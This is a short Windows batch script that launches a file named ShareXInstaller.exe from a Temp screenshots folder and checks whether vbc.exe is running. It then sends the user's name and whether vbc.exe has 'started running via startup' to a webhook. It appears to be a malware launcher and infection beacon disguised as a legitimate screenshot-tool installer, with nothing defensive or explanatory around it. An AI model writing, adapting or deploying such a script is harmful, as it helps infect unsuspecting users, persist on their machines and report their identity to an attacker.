@echo off
set EXE=vbc.exe
cd C:\Users\%username%\AppData\Local\Temp\screenshots\Sharex
start ShareXInstaller.exe
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto active
goto inactive
:inactive
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%username% has not started running vbc.exe via startup\"}" webhook
goto end
:active
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%username% has started running vbc.exe via startup\"}" webhook
goto end
:end